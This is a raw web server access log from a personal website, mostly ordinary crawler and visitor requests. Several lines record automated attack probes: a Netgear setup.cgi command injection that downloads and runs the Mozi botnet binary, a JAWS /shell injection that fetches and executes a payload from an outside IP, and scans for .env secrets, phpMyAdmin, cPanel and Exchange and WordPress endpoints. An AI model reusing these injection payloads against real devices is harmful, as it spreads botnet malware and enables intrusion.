2023-07-29T07:12:16.383Z IPv6::ffff:184.105.247.196:16100 GET>http://71.104.114.101/geoserver/web/
2023-07-29T07:14:57.627Z IPv6::ffff:185.180.143.141:49138 GET>https://71.104.114.101/
2023-07-29T07:17:51.254Z IPv6::ffff:192.241.201.31:39194 GET>http://71.104.114.101/actuator/health
2023-07-29T07:42:34.817Z IPv6::ffff:185.180.143.140:52148 GET>https://71.104.114.101/
2023-07-29T08:08:25.004Z IPv6::ffff:107.170.192.22:40590 GET>http://71.104.114.101/
2023-07-29T08:24:40.518Z IPv6::ffff:179.43.191.18:34722 GET>http://71.104.114.101/cpanel
2023-07-29T08:27:41.431Z IPv6::ffff:103.78.150.6:49428 GET>http://undefined/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
2023-07-29T08:34:03.615Z IPv6::ffff:61.0.98.47:38205 GET>http://71.104.114.101:80/
2023-07-29T08:39:40.001Z IPv6::ffff:185.180.143.18:43014 GET>https://71.104.114.101/
2023-07-29T08:40:42.596Z IPv6::ffff:179.43.191.18:38872 GET>https://agilegovleaders.org/
2023-07-29T08:43:17.632Z IPv6::ffff:179.43.191.18:35786 GET>https://71.104.114.101/cpanel
2023-07-29T08:43:36.541Z IPv6::ffff:179.43.191.18:57120 GET>https://71.104.114.101/cpanel
2023-07-29T08:44:55.449Z IPv6::ffff:179.43.191.18:52394 GET>https://71.104.114.101/cpanel
2023-07-29T08:56:14.554Z IPv6::ffff:179.43.191.18:46278 GET>https://71.104.114.101/cpanel
2023-07-29T09:05:12.500Z IPv6::ffff:179.43.191.18:50218 GET>http://71.104.114.101/cpanel
2023-07-29T09:18:16.371Z IPv6::ffff:179.43.191.18:42134 GET>https://71.104.114.101/cpanel
2023-07-29T09:20:22.507Z IPv6::ffff:179.43.191.18:55102 GET>http://71.104.114.101/cpanel
2023-07-29T09:20:41.816Z IPv6::ffff:95.214.27.39:42868 GET>http://71.104.114.101/phpMyAdmin/scripts/setup.php
2023-07-29T09:20:41.916Z IPv6::ffff:95.214.27.39:42868 POST>http://71.104.114.101/phpMyAdmin/scripts/setup.php
2023-07-29T09:24:10.020Z IPv6::ffff:5.161.107.91:59260 GET>http://www.natelevison.com/
2023-07-29T09:24:32.305Z IPv6::ffff:179.43.191.18:49978 GET>https://71.104.114.101/cpanel
2023-07-29T09:26:41.313Z IPv6::ffff:179.43.191.18:57226 GET>https://71.104.114.101/cpanel
2023-07-29T09:27:51.336Z IPv6::ffff:65.109.6.252:40056 GET>http://www.natelevison.com/robots.txt
2023-07-29T09:27:57.944Z IPv6::ffff:179.43.191.18:35434 GET>https://71.104.114.101/cpanel
2023-07-29T09:28:51.344Z IPv6::ffff:80.255.7.118:52356 GET>https://natelevison.com/
2023-07-29T09:30:18.433Z IPv6::ffff:167.71.254.229:20334 GET>http://www.natelevison.com/
2023-07-29T09:30:32.966Z IPv6::ffff:117.187.173.88:34134 GET>http://natelevison.com/
2023-07-29T09:30:48.010Z IPv6::ffff:117.187.173.88:34328 GET>https://natelevison.com/
2023-07-29T09:32:15.103Z IPv6::ffff:117.50.170.119:41174 GET>http://natelevison.com/
2023-07-29T09:32:17.895Z IPv6::ffff:117.50.170.119:42004 GET>http://natelevison.com/favicon.ico
2023-07-29T09:32:18.641Z IPv6::ffff:117.50.170.122:32990 GET>https://natelevison.com/
2023-07-29T09:32:20.549Z IPv6::ffff:117.50.170.119:42620 GET>http://natelevison.com/global/components/my-nav.js
2023-07-29T09:32:20.642Z IPv6::ffff:117.50.170.122:33364 GET>https://natelevison.com/favicon.ico
2023-07-29T09:32:21.200Z IPv6::ffff:117.50.170.119:42764 GET>http://natelevison.com/global/components/my-foot.js
2023-07-29T09:32:22.283Z IPv6::ffff:117.50.170.122:33658 GET>https://natelevison.com/global/components/my-foot.js
2023-07-29T09:32:22.433Z IPv6::ffff:117.50.170.119:43052 GET>http://natelevison.com/sitemap.xml
2023-07-29T09:32:22.568Z IPv6::ffff:117.50.170.119:43054 GET>http://natelevison.com/robots.txt
2023-07-29T09:32:23.282Z IPv6::ffff:117.50.170.122:33814 GET>https://natelevison.com/global/components/my-nav.js
2023-07-29T09:32:24.185Z IPv6::ffff:117.50.170.122:33982 GET>https://natelevison.com/robots.txt
2023-07-29T09:32:24.198Z IPv6::ffff:117.50.170.122:33980 GET>https://natelevison.com/sitemap.xml
2023-07-29T09:37:01.816Z IPv6::ffff:95.217.155.224:18392 GET>http://www.natelevison.com/
2023-07-29T09:37:17.658Z IPv6::ffff:192.71.42.108:44907 GET>http://natelevison.com/robots.txt
2023-07-29T09:37:17.860Z IPv6::ffff:192.71.44.44:41107 GET>http://natelevison.com/humans.txt
2023-07-29T09:37:18.064Z IPv6::ffff:192.36.53.165:19423 GET>http://natelevison.com/ads.txt
2023-07-29T09:37:18.505Z IPv6::ffff:192.71.38.71:64795 GET>http://natelevison.com/
2023-07-29T09:40:37.591Z IPv6::ffff:109.237.97.180:46116 GET>https://71.104.114.101/.env
2023-07-29T10:10:31.252Z IPv6::ffff:135.181.194.43:38482 GET>https://www.natelevison.com/
2023-07-29T10:10:56.876Z IPv6::ffff:45.156.129.2:46434 GET>https://71.104.114.101/
2023-07-29T10:13:11.537Z IPv6::ffff:64.225.69.111:24222 GET>https://www.natelevison.com/robots.txt
2023-07-29T10:13:54.691Z IPv6::ffff:24.199.125.15:41852 GET>https://www.natelevison.com/
2023-07-29T10:27:31.336Z IPv6::ffff:5.161.194.219:56448 GET>https://www.natelevison.com/
2023-07-29T10:29:51.667Z IPv6::ffff:185.180.143.7:43782 GET>http://71.104.114.101/
2023-07-29T10:59:14.384Z IPv6::ffff:45.156.129.7:45038 GET>https://71.104.114.101/
2023-07-29T11:20:22.901Z IPv6::ffff:45.156.129.12:46136 GET>https://71.104.114.101/
2023-07-29T11:46:49.021Z IPv6::ffff:35.171.144.152:33010 GET>http://natelevison.com./
2023-07-29T11:46:49.217Z IPv6::ffff:54.88.179.33:59105 GET>https://natelevison.com./
2023-07-29T11:46:49.153Z IPv6::ffff:35.171.144.152:28597 GET>http://www.natelevison.com./
2023-07-29T11:46:49.304Z IPv6::ffff:54.88.179.33:11306 GET>https://www.natelevison.com./
2023-07-29T11:49:39.362Z IPv6::ffff:185.142.236.43:47158 GET>http://71.104.114.101/
2023-07-29T11:49:39.888Z IPv6::ffff:185.142.236.43:48060 GET>http://71.104.114.101/robots.txt
2023-07-29T11:49:40.935Z IPv6::ffff:185.142.236.43:49224 GET>http://71.104.114.101/sitemap.xml
2023-07-29T11:49:41.403Z IPv6::ffff:185.142.236.43:49748 GET>http://71.104.114.101/.well-known/security.txt
2023-07-29T11:49:43.792Z IPv6::ffff:185.142.236.43:52168 GET>http://71.104.114.101/favicon.ico
2023-07-29T12:11:30.428Z IPv6::ffff:14.116.157.23:33856 GET>http://natelevison.com/
2023-07-29T12:45:56.949Z IPv6::ffff:198.235.24.86:61912 GET>http://71.104.114.101:80/
2023-07-29T12:46:44.568Z IPv6::ffff:185.180.143.81:44280 GET>https://71.104.114.101/
2023-07-29T13:16:04.977Z IPv6::ffff:198.199.92.98:46486 GET>https://71.104.114.101/autodiscover/autodiscover.json?@zdi/Powershell
2023-07-29T13:17:19.433Z IPv6::ffff:209.127.97.123:48516 HEAD>http://natelevison.comhttp://natelevison.com:80/
2023-07-29T13:17:20.390Z IPv6::ffff:198.20.189.196:15176 GET>http://natelevison.comhttp://natelevison.com:80/
2023-07-29T13:17:20.605Z IPv6::ffff:34.230.37.84:59004 GET>http://natelevison.com/favicon.ico
2023-07-29T13:17:20.739Z IPv6::ffff:170.247.221.154:18242 GET>http://natelevison.comhttp://natelevison.com:80/favicon.ico
2023-07-29T13:34:01.553Z IPv6::ffff:185.180.143.11:40616 GET>https://71.104.114.101/
2023-07-29T13:39:32.774Z IPv6::ffff:38.154.198.145:52226 GET>https://natelevison.com/
2023-07-29T13:39:32.992Z IPv6::ffff:192.241.67.111:59368 HEAD>http://natelevison.comhttp://natelevison.com:80/
2023-07-29T13:39:33.380Z IPv6::ffff:170.231.251.225:36916 GET>http://natelevison.comhttp://natelevison.com:80/
2023-07-29T13:39:33.642Z IPv6::ffff:3.83.190.24:57408 GET>http://natelevison.com/favicon.ico
2023-07-29T13:39:33.788Z IPv6::ffff:209.127.97.67:26426 GET>http://natelevison.comhttp://natelevison.com:80/favicon.ico
2023-07-29T15:49:50.572Z IPv6::ffff:185.180.143.7:34046 GET>https://71.104.114.101/
2023-07-29T15:55:54.033Z IPv6::ffff:167.94.146.53:48264 GET>https://71.104.114.101:443/
2023-07-29T15:55:54.341Z IPv6::ffff:167.94.146.53:35046 GET>https://71.104.114.101/
2023-07-29T15:55:55.082Z IPv6::ffff:167.94.146.53:58564 GET>https://71.104.114.101/favicon.ico
2023-07-29T16:05:45.759Z IPv6::ffff:109.237.98.226:33488 GET>http://71.104.114.101/.env
2023-07-29T16:09:43.748Z IPv6::ffff:71.104.114.101:58702 GET>http://natelevison.com/
2023-07-29T16:09:43.799Z IPv6::ffff:71.104.114.101:58702 GET>http://natelevison.com/style.css
2023-07-29T16:09:43.819Z IPv6::ffff:71.104.114.101:58702 GET>http://natelevison.com/global/components/globalComponents.css
2023-07-29T16:09:43.825Z IPv6::ffff:71.104.114.101:58703 GET>http://natelevison.com/global/components/my-foot.js
2023-07-29T16:09:43.830Z IPv6::ffff:71.104.114.101:58704 GET>http://natelevison.com/global/components/my-nav.js
2023-07-29T16:09:43.857Z IPv6::ffff:71.104.114.101:58702 GET>http://natelevison.com/img/logo.png
2023-07-29T16:10:26.878Z IPv6::ffff:66.102.8.3:44904 GET>http://natelevison.com/
2023-07-29T16:10:26.943Z IPv6::ffff:66.102.8.3:44904 GET>http://natelevison.com/style.css
2023-07-29T16:10:26.957Z IPv6::ffff:66.102.8.4:38841 GET>http://natelevison.com/global/components/my-foot.js
2023-07-29T16:10:26.976Z IPv6::ffff:66.102.8.3:54030 GET>http://natelevison.com/global/components/globalComponents.css
2023-07-29T16:10:27.102Z IPv6::ffff:66.102.8.3:54030 GET>http://natelevison.com/img/logo.png
2023-07-29T16:10:26.985Z IPv6::ffff:66.102.8.5:50776 GET>http://natelevison.com/global/components/my-nav.js
2023-07-29T16:11:44.148Z IPv6::ffff:71.104.114.101:58798 GET>https://natelevison.com/
2023-07-29T16:11:44.279Z IPv6::ffff:71.104.114.101:58798 GET>https://natelevison.com/style.css
2023-07-29T16:11:44.293Z IPv6::ffff:71.104.114.101:58798 GET>https://natelevison.com/global/components/globalComponents.css
2023-07-29T16:11:44.318Z IPv6::ffff:71.104.114.101:58798 GET>https://natelevison.com/global/components/my-foot.js
2023-07-29T16:11:44.319Z IPv6::ffff:71.104.114.101:58799 GET>https://natelevison.com/global/components/my-nav.js
2023-07-29T16:11:44.344Z IPv6::ffff:71.104.114.101:58798 GET>https://natelevison.com/img/logo.png
2023-07-29T16:12:29.000Z IPv6::ffff:71.104.114.101:58806 GET>https://natelevison.com/my_projects/
2023-07-29T16:12:29.144Z IPv6::ffff:71.104.114.101:58806 GET>https://natelevison.com/style.css
2023-07-29T16:12:29.157Z IPv6::ffff:71.104.114.101:58806 GET>https://natelevison.com/my_projects/style.css
2023-07-29T16:12:29.173Z IPv6::ffff:71.104.114.101:58806 GET>https://natelevison.com/global/components/my-nav.js
2023-07-29T16:12:29.176Z IPv6::ffff:71.104.114.101:58807 GET>https://natelevison.com/global/components/globalComponents.css
2023-07-29T16:12:29.177Z IPv6::ffff:71.104.114.101:58808 GET>https://natelevison.com/global/components/my-foot.js
2023-07-29T16:12:29.194Z IPv6::ffff:71.104.114.101:58806 GET>https://natelevison.com/my_projects/script.js
2023-07-29T16:12:29.201Z IPv6::ffff:71.104.114.101:58807 GET>https://natelevison.com/img/logo.png
2023-07-29T16:12:34.367Z IPv6::ffff:71.104.114.101:58810 GET>https://natelevison.com/my_projects/java/
2023-07-29T16:12:34.440Z IPv6::ffff:71.104.114.101:58810 GET>https://natelevison.com/global/components/my-nav.js
2023-07-29T16:12:34.428Z IPv6::ffff:71.104.114.101:58810 GET>https://natelevison.com/global/components/globalComponents.css
2023-07-29T16:12:34.452Z IPv6::ffff:71.104.114.101:58811 GET>https://natelevison.com/my_projects/subpagestyle.css
2023-07-29T16:12:34.465Z IPv6::ffff:71.104.114.101:58812 GET>https://natelevison.com/global/components/my-foot.js
2023-07-29T16:12:34.544Z IPv6::ffff:71.104.114.101:58810 GET>https://natelevison.com/img/logo.png
2023-07-29T16:12:34.468Z IPv6::ffff:71.104.114.101:58813 GET>https://natelevison.com/my_projects/java/script.js
2023-07-29T16:21:13.420Z IPv6::ffff:198.199.76.233:41854 GET>https://71.104.114.101/
2023-07-29T16:37:09.196Z IPv6::ffff:162.243.132.16:33192 GET>https://71.104.114.101/owa/auth/logon.aspx
2023-07-29T16:50:42.053Z IPv6::ffff:183.136.225.9:8906 GET>https://71.104.114.101:443/
2023-07-29T16:50:42.958Z IPv6::ffff:183.136.225.9:11310 GET>https://71.104.114.101:443/
2023-07-29T16:50:43.843Z IPv6::ffff:183.136.225.9:13940 GET>https://71.104.114.101:443/favicon.ico
2023-07-29T16:50:46.610Z IPv6::ffff:183.136.225.9:22918 GET>https://71.104.114.101:443/robots.txt
2023-07-29T16:50:48.724Z IPv6::ffff:183.136.225.9:25826 GET>https://71.104.114.101:443/./global/components/my-nav.js
2023-07-29T16:50:49.641Z IPv6::ffff:183.136.225.9:32460 GET>https://71.104.114.101:443/./global/components/my-foot.js
2023-07-29T16:59:59.480Z IPv6::ffff:50.62.222.40:23047 GET>http://natelevison.com/wp-login.php
2023-07-29T17:15:56.738Z IPv6::ffff:152.203.215.250:40327 GET>http://71.104.114.101/
2023-07-29T18:00:22.973Z IPv6::ffff:159.203.114.215:53410 GET>https://71.104.114.101/
2023-07-29T18:00:23.078Z IPv6::ffff:159.203.114.215:53410 GET>https://71.104.114.101/favicon.ico
2023-07-29T18:21:46.976Z IPv6::ffff:113.125.140.19:53472 GET>http://natelevison.com/
2023-07-29T18:24:36.141Z IPv6::ffff:45.156.129.2:52298 GET>https://71.104.114.101/
2023-07-29T18:25:20.861Z IPv6::ffff:216.251.130.74:40608 GET>http://natelevison.com/
2023-07-29T18:25:20.965Z IPv6::ffff:216.251.130.74:40608 GET>http://natelevison.com/style.css
2023-07-29T18:25:21.055Z IPv6::ffff:216.251.130.74:40624 GET>http://natelevison.com/global/components/my-foot.js
2023-07-29T18:25:21.056Z IPv6::ffff:216.251.130.74:40618 GET>http://natelevison.com/global/components/my-nav.js
2023-07-29T18:25:21.056Z IPv6::ffff:216.251.130.74:40608 GET>http://natelevison.com/global/components/globalComponents.css
2023-07-29T18:25:21.149Z IPv6::ffff:216.251.130.74:40618 GET>http://natelevison.com/img/logo.png
2023-07-29T18:49:15.479Z IPv6::ffff:45.156.129.2:59646 GET>https://71.104.114.101/
2023-07-29T18:52:32.549Z IPv6::ffff:181.214.164.109:43910 GET>http://71.104.114.101/
2023-07-29T19:05:36.495Z IPv6::ffff:113.142.141.105:46076 GET>http://71.104.114.101:80/
2023-07-29T19:05:39.367Z IPv6::ffff:218.145.61.20:49296 GET>http://127.0.0.1:80/shell?cd+/tmp;rm+-rf+*;wget+37.44.238.203/nekoY/jaws;sh+/tmp/jaws
2023-07-29T19:23:40.282Z IPv6::ffff:45.156.128.7:49546 GET>https://71.104.114.101/
2023-07-29T19:30:39.418Z IPv6::ffff:205.210.31.204:62034 GET>http://71.104.114.101:3000/
2023-07-29T19:40:28.651Z IPv6::ffff:58.17.6.9:37520 GET>https://www.natelevison.com/
2023-07-29T19:40:29.308Z IPv6::ffff:58.17.6.9:59002 GET>http://www.natelevison.com/
2023-07-29T19:55:55.173Z IPv6::ffff:139.59.32.173:48386 GET>http://71.104.114.101/1.php
2023-07-29T19:55:55.715Z IPv6::ffff:139.59.32.173:48400 GET>http://71.104.114.101/bundle.js
2023-07-29T19:56:55.140Z IPv6::ffff:94.126.13.74:35588 GET>http://71.104.114.101:80/
2023-07-29T20:00:53.433Z IPv6::ffff:103.110.33.235:40238 GET>http://71.104.114.101/
2023-07-29T20:08:21.139Z IPv6::ffff:117.62.218.192:34079 GET>https://71.104.114.101/
2023-07-29T20:17:03.499Z IPv6::ffff:141.98.6.31:57806 GET>http://71.104.114.101:80/
2023-07-29T20:57:13.753Z IPv6::ffff:31.220.1.83:53784 GET>http://71.104.114.101/
2023-07-29T21:14:00.424Z IPv6::ffff:92.118.39.40:39784 GET>http://71.104.114.101/
2023-07-29T21:24:13.173Z IPv6::ffff:198.199.115.122:45886 GET>https://71.104.114.101/
2023-07-29T21:31:52.490Z IPv6::ffff:141.98.6.31:41748 GET>http://71.104.114.101:80/
2023-07-29T21:51:43.912Z IPv6::ffff:167.248.133.37:58026 GET>http://71.104.114.101:80/
2023-07-29T21:51:44.063Z IPv6::ffff:167.248.133.37:58050 GET>http://71.104.114.101/
2023-07-29T21:51:44.221Z IPv6::ffff:167.248.133.37:43414 GET>http://71.104.114.101/favicon.ico
2023-07-29T21:59:41.165Z IPv6::ffff:162.243.137.14:53770 GET>http://71.104.114.101/hudson
2023-07-29T22:18:56.426Z IPv6::ffff:191.102.155.209:55566 GET>http://natelevison.comhttp://natelevison.com:80/
2023-07-29T22:34:05.060Z IPv6::ffff:141.98.11.60:52148 GET>http://71.104.114.101/
2023-07-29T22:46:09.423Z IPv6::ffff:139.59.32.173:42868 GET>https://71.104.114.101/ab2h
2023-07-29T22:46:11.510Z IPv6::ffff:139.59.32.173:42894 GET>https://71.104.114.101/favicon.ico
2023-07-29T22:47:00.720Z IPv6::ffff:45.128.232.83:33850 GET>http://71.104.114.101:80/
2023-07-29T22:47:03.714Z IPv6::ffff:45.128.232.83:54062 POST>http://71.104.114.101:80/HNAP1/
2023-07-29T22:57:41.270Z IPv6::ffff:185.180.143.140:57130 GET>http://71.104.114.101/
2023-07-29T23:01:22.398Z IPv6::ffff:185.180.143.140:58906 GET>https://71.104.114.101/
2023-07-29T23:12:51.467Z IPv6::ffff:123.60.146.214:50092 GET>http://www.natelevison.com/
2023-07-29T23:27:53.428Z IPv6::ffff:107.170.237.54:52650 GET>http://71.104.114.101/druid/index.html
2023-07-29T23:34:58.963Z IPv6::ffff:66.249.72.4:59544 GET>http://natelevison.com/robots.txt
2023-07-29T23:34:59.072Z IPv6::ffff:66.249.72.5:39082 GET>http://natelevison.com/my_projects/
2023-07-29T23:35:00.549Z IPv6::ffff:66.249.72.3:48193 GET>http://natelevison.com/global/components/globalComponents.css
2023-07-29T23:35:00.901Z IPv6::ffff:66.249.72.5:39082 GET>http://natelevison.com/my_projects/style.css
2023-07-29T23:35:01.357Z IPv6::ffff:66.249.72.5:39082 GET>http://natelevison.com/global/components/my-foot.js
2023-07-29T23:35:01.810Z IPv6::ffff:66.249.72.4:59544 GET>http://natelevison.com/style.css
2023-07-29T23:35:02.266Z IPv6::ffff:66.249.72.3:48193 GET>http://natelevison.com/my_projects/script.js
2023-07-29T23:49:58.062Z IPv6::ffff:223.240.101.111:59880 GET>http://71.104.114.101:80/
2023-07-30T00:06:48.091Z IPv6::ffff:185.233.19.233:58284 GET>https://natelevison.com/
2023-07-30T00:07:10.332Z IPv6::ffff:185.233.19.233:60992 GET>https://natelevison.com/favicon.ico
2023-07-30T00:07:14.439Z IPv6::ffff:185.233.19.233:33422 GET>https://natelevison.com/global/components/my-nav.js
2023-07-30T00:09:06.752Z IPv6::ffff:118.193.45.5:29236 GET>http://www.natelevison.com/
2023-07-30T00:09:07.094Z IPv6::ffff:152.32.131.34:3462 GET>https://www.natelevison.com/
2023-07-30T00:09:07.232Z IPv6::ffff:118.193.45.5:29282 GET>http://www.natelevison.com/favicon.ico
2023-07-30T00:09:08.513Z IPv6::ffff:152.32.131.34:3598 GET>https://www.natelevison.com/favicon.ico
2023-07-30T00:09:09.342Z IPv6::ffff:118.193.45.5:29484 GET>http://www.natelevison.com/global/components/my-nav.js
2023-07-30T00:09:10.536Z IPv6::ffff:152.32.131.34:3734 GET>https://www.natelevison.com/global/components/my-nav.js
2023-07-30T00:14:18.010Z IPv6::ffff:45.128.232.65:57606 GET>http://71.104.114.101:80/
2023-07-30T00:20:00.401Z IPv6::ffff:104.131.128.17:60360 GET>http://71.104.114.101:3000/
2023-07-30T00:37:59.806Z IPv6::ffff:198.235.24.239:55013 GET>http://undefined/
2023-07-30T00:52:14.848Z IPv6::ffff:206.189.35.202:56050 GET>http://71.104.114.101/
2023-07-30T00:52:15.322Z IPv6::ffff:206.189.35.202:56056 GET>http://71.104.114.101/client/get_targets
2023-07-30T00:52:15.963Z IPv6::ffff:206.189.35.202:56062 GET>http://71.104.114.101/files/
2023-07-30T00:56:08.240Z IPv6::ffff:45.156.128.7:45792 GET>https://71.104.114.101/
2023-07-30T01:00:16.536Z IPv6::ffff:191.102.149.174:52526 GET>http://natelevison.comhttp://natelevison.com:80/
2023-07-30T01:04:58.824Z IPv6::ffff:66.249.72.4:37892 GET>http://natelevison.com/
2023-07-30T01:05:00.533Z IPv6::ffff:66.249.72.4:37892 GET>http://natelevison.com/style.css
2023-07-30T01:05:00.933Z IPv6::ffff:66.249.72.4:37892 GET>http://natelevison.com/global/components/my-nav.js
2023-07-30T01:05:01.390Z IPv6::ffff:66.249.72.4:37892 GET>http://natelevison.com/global/components/my-foot.js
2023-07-30T01:05:01.841Z IPv6::ffff:66.249.72.4:37892 GET>http://natelevison.com/global/components/globalComponents.css
2023-07-30T01:38:32.395Z IPv6::ffff:15.204.182.106:43098 GET>http://www.natelevison.com/
2023-07-30T01:38:32.360Z IPv6::ffff:15.204.182.106:43094 GET>http://natelevison.com/
2023-07-30T01:43:37.019Z IPv6::ffff:34.140.248.32:44734 GET>http://71.104.114.101/
2023-07-30T02:21:07.042Z IPv6::ffff:14.116.150.68:55508 GET>http://natelevison.com/
2023-07-30T02:34:58.914Z IPv6::ffff:66.249.72.5:55390 GET>https://natelevison.com/robots.txt
2023-07-30T02:34:59.103Z IPv6::ffff:66.249.72.4:47339 GET>https://natelevison.com/
2023-07-30T02:35:00.517Z IPv6::ffff:66.249.72.5:55390 GET>https://natelevison.com/global/components/globalComponents.css
2023-07-30T02:35:00.909Z IPv6::ffff:66.249.72.4:47339 GET>https://natelevison.com/style.css
2023-07-30T02:35:01.443Z IPv6::ffff:66.249.72.6:54593 GET>https://natelevison.com/global/components/my-foot.js
2023-07-30T02:35:01.831Z IPv6::ffff:66.249.72.5:55390 GET>https://natelevison.com/global/components/my-nav.js
2023-07-30T03:15:11.980Z IPv6::ffff:46.101.77.74:42038 GET>http://71.104.114.101:3000/
2023-07-30T03:36:31.075Z IPv6::ffff:104.152.52.200:48143 GET>http://undefined/
2023-07-30T03:37:46.294Z IPv6::ffff:103.149.192.217:46023 GET>https://71.104.114.101/
2023-07-30T03:38:42.022Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/
2023-07-30T03:38:42.328Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/
2023-07-30T03:38:42.596Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/wp-includes/wlwmanifest.xml
2023-07-30T03:38:42.851Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/xmlrpc.php?rsd
2023-07-30T03:38:43.122Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/
2023-07-30T03:38:43.399Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/blog/wp-includes/wlwmanifest.xml
2023-07-30T03:38:43.655Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/web/wp-includes/wlwmanifest.xml
2023-07-30T03:38:43.928Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/wordpress/wp-includes/wlwmanifest.xml
2023-07-30T03:38:44.197Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/website/wp-includes/wlwmanifest.xml
2023-07-30T03:38:44.456Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/wp/wp-includes/wlwmanifest.xml
2023-07-30T03:38:44.722Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/news/wp-includes/wlwmanifest.xml
2023-07-30T03:38:44.976Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/2020/wp-includes/wlwmanifest.xml
2023-07-30T03:38:45.270Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/2019/wp-includes/wlwmanifest.xml
2023-07-30T03:38:45.539Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/shop/wp-includes/wlwmanifest.xml
2023-07-30T03:38:45.799Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/wp1/wp-includes/wlwmanifest.xml
2023-07-30T03:38:46.056Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/test/wp-includes/wlwmanifest.xml
2023-07-30T03:38:46.327Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/wp2/wp-includes/wlwmanifest.xml
2023-07-30T03:38:46.607Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/site/wp-includes/wlwmanifest.xml
2023-07-30T03:38:46.927Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/cms/wp-includes/wlwmanifest.xml
2023-07-30T03:38:47.210Z IPv6::ffff:156.146.56.133:35456 GET>http://natelevison.com/sito/wp-includes/wlwmanifest.xml
2023-07-30T03:46:36.178Z IPv6::ffff:206.189.35.202:45414 GET>https://71.104.114.101/t4
2023-07-30T03:46:38.556Z IPv6::ffff:206.189.35.202:45428 GET>https://71.104.114.101/favicon.ico
2023-07-30T04:04:25.712Z IPv6::ffff:185.233.19.217:30836 GET>http://71.104.114.101:80/
2023-07-30T04:09:44.634Z IPv6::ffff:141.98.11.60:54768 GET>http://71.104.114.101/
2023-07-30T04:11:37.079Z IPv6::ffff:34.140.130.61:56064 GET>https://71.104.114.101/
2023-07-30T04:36:00.593Z IPv6::ffff:66.249.72.196:59270 GET>http://www.natelevison.com/robots.txt
2023-07-30T04:36:00.701Z IPv6::ffff:66.249.72.195:38610 GET>http://www.natelevison.com/
2023-07-30T04:36:02.220Z IPv6::ffff:66.249.72.195:38610 GET>http://www.natelevison.com/global/components/my-foot.js
2023-07-30T04:36:02.625Z IPv6::ffff:66.249.72.195:38610 GET>http://www.natelevison.com/global/components/globalComponents.css
2023-07-30T04:36:03.080Z IPv6::ffff:66.249.72.195:38610 GET>http://www.natelevison.com/global/components/my-nav.js
2023-07-30T04:36:03.534Z IPv6::ffff:66.249.72.195:38610 GET>http://www.natelevison.com/style.css
2023-07-30T04:50:51.905Z IPv6::ffff:162.216.150.48:63350 GET>http://71.104.114.101:80/
2023-07-30T04:52:36.019Z IPv6::ffff:45.156.129.7:54436 GET>http://71.104.114.101/
2023-07-30T05:30:02.134Z IPv6::ffff:66.249.72.195:62259 GET>http://www.natelevison.com/
2023-07-30T05:30:03.123Z IPv6::ffff:66.249.72.197:46083 GET>http://www.natelevison.com/global/components/my-nav.js
2023-07-30T05:30:03.495Z IPv6::ffff:66.249.72.197:46083 GET>http://www.natelevison.com/global/components/globalComponents.css
2023-07-30T05:30:03.988Z IPv6::ffff:66.249.72.196:61770 GET>http://www.natelevison.com/style.css
2023-07-30T05:30:04.403Z IPv6::ffff:66.249.72.196:61770 GET>http://www.natelevison.com/global/components/my-foot.js
2023-07-30T05:30:07.702Z IPv6::ffff:66.249.72.196:44238 GET>http://www.natelevison.com/
2023-07-30T05:49:36.042Z IPv6::ffff:66.249.72.5:45623 GET>https://natelevison.com/about/
